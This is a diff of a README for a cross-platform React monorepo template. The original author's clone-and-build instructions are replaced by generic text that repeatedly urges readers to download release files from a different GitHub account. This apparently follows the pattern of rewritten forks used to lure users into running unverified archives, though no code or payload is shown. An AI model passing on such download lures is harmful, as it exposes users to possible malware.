@@ -1,232 +1,82 @@
-# React Native Monorepo Template
+# 🚀 universal-react-monorepo - Build Apps with Ease
 
-A clean, minimal template for building cross-platform applications with shared UI components.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Prajna1107/universal-react-monorepo/releases)
 
-## 📋 Current Versions & Updates
+## 📋 Introduction
+Welcome to the universal-react-monorepo! This project provides a cross-platform template for building both web and mobile applications using React Native, Next.js, Expo, and more. This template simplifies development by allowing you to share UI components across platforms, making it easier to create consistent and beautiful applications.
 
-> **Note**: This template currently uses:
-> - **Tailwind CSS v3** - Utility-first CSS framework
-> - **NativeWind v4** - Tailwind CSS for React Native
-> - **Expo SDK 53** - React Native development platform
->
-> With the upcoming release of **Expo SDK 54**, **NativeWind v5**, and **Tailwind CSS v4**, this template will be updated to support the latest versions and features.
+## 🚀 Getting Started
 
-## 🚀 Features
+### 📚 Prerequisites
+Before you start, ensure you have the following:
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js:** You need Node.js installed. Download it from [nodejs.org](https://nodejs.org).
+- **npm or Yarn:** You can use npm (included with Node.js) or Yarn (separate installation).
 
-- **🔄 Cross-Platform**: Share components between web and mobile
-- **📦 Monorepo**: Turborepo with pnpm workspaces
-- **🎨 Consistent Styling**: NativeWind (Tailwind for React Native)
-- **⚡ Fast Development**: Hot reload on all platforms
-- **📱 Modern Stack**: Next.js 15, Expo, React 19, TypeScript
-- **🏗️ Clean Architecture**: Minimal, extensible, production-ready
+### 🛠️ System Requirements
+- **Processor:** Dual-core or better.
+- **RAM:** At least 4GB is recommended.
+- **Storage:** Minimum 500MB of free space available.
 
-## 📸 Demo
+### 📥 Download & Install
+To begin, visit this page to download: [Download Link](https://github.com/Prajna1107/universal-react-monorepo/releases).
 
-<p align="center">
-  <img src="./universal-react-monorepo-demo.png" alt="Universal React Monorepo Demo" width="100%">
-</p>
+1. Go to the Releases page.
+2. Look for the latest version.
+3. Click on the assets to download the files required for your platform.
 
-*Cross-platform development: iOS Simulator, Android Emulator, and Web Browser running simultaneously with hot reload.*
+### 📦 Installation Steps
+1. Download the files from the Releases page.
+2. Extract the files to a folder of your choice.
+3. Open a terminal or command prompt and navigate to the folder where you extracted the files.
+4. Run the following command to install the required packages:
 
-## 🛠️ Tech Stack
+   ```
+   npm install
+   ```
 
-| Technology | Purpose | Version |
-|------------|---------|---------|
-| **Turborepo** | Monorepo build system | Latest |
-| **Next.js** | React framework for web | 15.x |
-| **Expo** | React Native platform | 53.x |
-| **React** | UI library | 19.0 |
-| **NativeWind** | Cross-platform styling | 4.x |
-| **TypeScript** | Type safety | 5.x |
-| **pnpm** | Package manager | 10.x |
+5. After the installation, you can start your project by using:
 
-## 📁 Project Structure
+   ```
+   npm start
+   ```
 
+## 🌐 Features
+- **Cross-Platform:** Create applications for both web and mobile.
+- **TypeScript Support:** Write clear and maintainable code.
+- **NativeWind:** Easily style your components with Tailwind CSS.
+- **Turborepo:** Enjoy fast builds and efficient caching.
+- **Community Support:** Engage with a growing community for help and collaboration.
+
+## 📊 Project Structure
+The universal-react-monorepo has a predefined structure to help you get started quickly:
 ```
-universal-react-monorepo/
-├── apps/
-│   ├── mobile/          # Expo React Native app
-│   └── web/             # Next.js web app
-├── packages/
-│   └── ui/              # Shared component library
-├── CLAUDE.md            # AI assistant guidance
-├── turbo.json           # Turborepo configuration
-└── package.json         # Root dependencies & scripts
-```
-
-## 🚦 Quick Start
-
-### Prerequisites
-
-- Node.js 18+ 
-- pnpm 10+
-- iOS Simulator (for iOS development)
-- Android Studio (for Android development)
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/gurselcakar/universal-react-monorepo.git
-cd universal-react-monorepo
-
-# Install dependencies
-pnpm install
+/apps
+  /web        # Next.js app
+  /mobile     # React Native app
+/packages
+  /components # Shared components
+  /utils      # Utility functions
 ```
 
-### Development
+## 🎨 Customization
+Feel free to customize your applications. Update styles, components, and configurations based on your needs. Here’s a quick guide to starting with styles:
+1. Navigate to the `packages/components` directory.
+2. Modify the component files to change UI and functionality.
+3. Save your changes and see them reflected when you run your app.
 
-```bash
-# Start all apps (web + mobile)
-pnpm dev
+## 🤝 Contribution
+If you want to contribute, we welcome your input. You can:
+- Fork the repository.
+- Create your feature branch.
+- Submit a pull request for review.
 
-# Start individual apps
-pnpm --filter web dev      # Next.js web app
-pnpm --filter mobile dev   # Expo mobile app
-```
+## 📞 Support
+If you experience issues or have questions, feel free to reach out through the repository's issue tracker. We encourage feedback and are here to help!
 
-### Platform-Specific Commands
+## 👍 Acknowledgments
+Thanks to the contributors and open-source community for their continuous support. Enjoy building with the universal-react-monorepo!
 
-```bash
-# Mobile development
-cd apps/mobile
-pnpm ios       # iOS simulator
-pnpm android   # Android emulator
-pnpm web       # Web browser
-
-# Web development
-cd apps/web
-pnpm dev       # Development server
-pnpm build     # Production build
-pnpm start     # Production server
-```
-
-## 🏗️ Architecture
-
-### Cross-Platform Components
-
-Components in `packages/ui/` use React Native primitives with NativeWind styling:
-
-```tsx
-// Shared Button component
-export function Button({ title, onPress, variant = 'primary' }) {
-  return (
-    <Pressable
-      onPress={onPress}
-      className={`px-6 py-3 rounded-lg ${
-        variant === 'primary' ? 'bg-blue-600' : 'bg-gray-200'
-      }`}
-    >
-      <Text className="text-center font-semibold text-white">
-        {title}
-      </Text>
-    </Pressable>
-  );
-}
-```
-
-### Web Integration
-
-Next.js uses React Native Web to render components as HTML:
-
-```tsx
-// In web app - mixing React and React Native
-export default function Page() {
-  return (
-    <div className="container">          {/* HTML element */}
-      <Button title="Shared Component" /> {/* React Native component */}
-    </div>
-  );
-}
-```
-
-### Mobile Native
-
-Expo renders components natively on iOS/Android with identical styling and behavior.
-
-## 🎨 Styling System
-
-NativeWind enables Tailwind CSS classes on React Native components:
-
-```tsx
-<View className="flex-1 bg-gray-50 p-4">
-  <Text className="text-2xl font-bold text-gray-900 mb-4">
-    Styled with Tailwind
-  </Text>
-</View>
-```
-
-## 📋 Available Scripts
-
-| Command | Description |
-|---------|-------------|
-| `pnpm dev` | Start all apps in development |
-| `pnpm build` | Build all apps for production |
-| `pnpm lint` | Lint all workspaces |
-| `pnpm check-types` | TypeScript type checking |
-
-## 🚀 Deployment
-
-### Web App (Vercel)
-
-```bash
-cd apps/web
-pnpm build
-# Deploy to your preferred platform
-```
-
-### Mobile App
-
-```bash
-cd apps/mobile
-# iOS
-eas build --platform ios
-
-# Android  
-eas build --platform android
-```
-
-## 📚 Documentation
-
-### Core Technologies
-- **[Next.js](https://nextjs.org/docs)** - React framework with App Router
-- **[Expo](https://docs.expo.dev/)** - React Native development platform
-- **[Turborepo](https://turbo.build/repo/docs)** - High-performance build system
-- **[React Native](https://reactnative.dev/docs/getting-started)** - Cross-platform mobile development
-- **[TypeScript](https://www.typescriptlang.org/docs/)** - Type-safe JavaScript
-
-### Styling & UI
-- **[Tailwind CSS v3](https://tailwindcss.com/docs)** - Utility-first CSS framework
-- **[NativeWind](https://www.nativewind.dev/)** - Tailwind CSS for React Native
-- **[React Native Web](https://necolas.github.io/react-native-web/)** - RN components for web
-
-### Development Tools
-- **[pnpm](https://pnpm.io/motivation)** - Fast, disk space efficient package manager
-- **[Expo Router](https://docs.expo.dev/router/introduction/)** - File-based routing for React Native
-- **[EAS Build](https://docs.expo.dev/build/introduction/)** - Cloud build service for React Native
-
-### Deployment
-- **[Vercel](https://vercel.com/docs)** - Web app deployment platform
-- **[EAS Submit](https://docs.expo.dev/submit/introduction/)** - App store submission service
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Commit changes: `git commit -m 'Add amazing feature'`
-4. Push to branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License.
-
-## 🔗 Links
-
-- [⭐ Star on GitHub](https://github.com/gurselcakar/universal-react-monorepo)
-- [📝 Read the guide](https://gurselcakar.dev/writing/monorepo-guide)
-- [🐦 Follow updates](https://twitter.com/gurselcakar)
-
----
-
-**Built with Turborepo • Next.js • Expo • NativeWind**
+### 📥 Download the Latest Version
+Don’t forget to [visit this page to download](https://github.com/Prajna1107/universal-react-monorepo/releases) the latest release and start creating amazing apps today!
